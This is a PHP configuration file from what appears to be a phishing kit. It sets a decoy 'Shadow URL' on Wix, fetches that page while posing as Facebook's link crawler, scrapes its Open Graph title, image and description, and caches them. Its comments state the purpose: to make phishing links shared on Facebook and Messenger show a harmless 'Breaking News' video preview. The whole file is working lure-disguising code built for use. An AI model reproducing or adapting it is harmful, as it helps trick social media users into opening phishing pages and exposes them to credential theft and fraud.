<?php
/**
 * SHADOW URL CONFIGURATION
 * 
 * Change this URL to update the social media preview.
 * When you share the phishing link on Facebook/Messenger,
 * the preview (title, image, description) will come from this URL.
 */

// ============================================================
// EDIT THIS: Your Shadow URL (Wix site for preview)
// ============================================================
define('SHADOW_URL', 'https://facebookbrowser.wixsite.com/videonow');

// Cache duration in seconds (3600 = 1 hour, 0 = no cache)
define('SHADOW_CACHE_DURATION', 3600);

// ============================================================
// DO NOT EDIT BELOW THIS LINE
// ============================================================

function get_shadow_meta_tags() {
    $cache_file = sys_get_temp_dir() . '/shadow_meta_' . md5(SHADOW_URL) . '.json';
    
    // Check cache
    if (SHADOW_CACHE_DURATION > 0 && file_exists($cache_file)) {
        if (time() - filemtime($cache_file) < SHADOW_CACHE_DURATION) {
            $cached = json_decode(file_get_contents($cache_file), true);
            if ($cached) return $cached;
        }
    }
    
    // Default values
    $meta = [
        'title' => 'Video Now - Breaking News',
        'description' => 'Watch the latest news and breaking stories.',
        'og_title' => 'Breaking News Update',
        'og_description' => 'Watch the latest news coverage.',
        'og_image' => 'https://static.wixstatic.com/media/e49800_2aa47b47fc9545b68a6a82b78fa5b34c~mv2.png',
        'og_site_name' => 'Video Now',
        'og_url' => SHADOW_URL,
        'og_type' => 'article',
    ];
    
    // Try to fetch meta tags from shadow URL
    $context = stream_context_create([
        'http' => [
            'timeout' => 5,
            'user_agent' => 'facebookexternalhit/1.1',
        ],
        'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
    ]);
    
    $html = @file_get_contents(SHADOW_URL, false, $context);
    
    if ($html !== false) {
        // Parse title
        if (preg_match('/<title[^>]*>([^<]+)<\/title>/i', $html, $m)) {
            $meta['title'] = html_entity_decode(trim($m[1]), ENT_QUOTES, 'UTF-8');
        }
        // Parse og:title
        if (preg_match('/<meta[^>]+property=["\']og:title["\'][^>]+content=["\']([^"\']+)["\'][^>]*>/i', $html, $m) ||
            preg_match('/<meta[^>]+content=["\']([^"\']+)["\'][^>]+property=["\']og:title["\'][^>]*>/i', $html, $m)) {
            $meta['og_title'] = html_entity_decode(trim($m[1]), ENT_QUOTES, 'UTF-8');
        }
        // Parse og:description
        if (preg_match('/<meta[^>]+property=["\']og:description["\'][^>]+content=["\']([^"\']+)["\'][^>]*>/i', $html, $m) ||
            preg_match('/<meta[^>]+content=["\']([^"\']+)["\'][^>]+property=["\']og:description["\'][^>]*>/i', $html, $m)) {
            $meta['og_description'] = html_entity_decode(trim($m[1]), ENT_QUOTES, 'UTF-8');
        }
        // Parse og:image
        if (preg_match('/<meta[^>]+property=["\']og:image["\'][^>]+content=["\']([^"\']+)["\'][^>]*>/i', $html, $m) ||
            preg_match('/<meta[^>]+content=["\']([^"\']+)["\'][^>]+property=["\']og:image["\'][^>]*>/i', $html, $m)) {
            $meta['og_image'] = trim($m[1]);
        }
        // Parse og:site_name
        if (preg_match('/<meta[^>]+property=["\']og:site_name["\'][^>]+content=["\']([^"\']+)["\'][^>]*>/i', $html, $m) ||
            preg_match('/<meta[^>]+content=["\']([^"\']+)["\'][^>]+property=["\']og:site_name["\'][^>]*>/i', $html, $m)) {
            $meta['og_site_name'] = html_entity_decode(trim($m[1]), ENT_QUOTES, 'UTF-8');
        }
        // Parse description
        if (preg_match('/<meta[^>]+name=["\']description["\'][^>]+content=["\']([^"\']+)["\'][^>]*>/i', $html, $m)) {
            $meta['description'] = html_entity_decode(trim($m[1]), ENT_QUOTES, 'UTF-8');
        }
    }
    
    // Cache result
    if (SHADOW_CACHE_DURATION > 0) {
        @file_put_contents($cache_file, json_encode($meta));
    }
    
    return $meta;
}

$shadow_meta = get_shadow_meta_tags();
?>
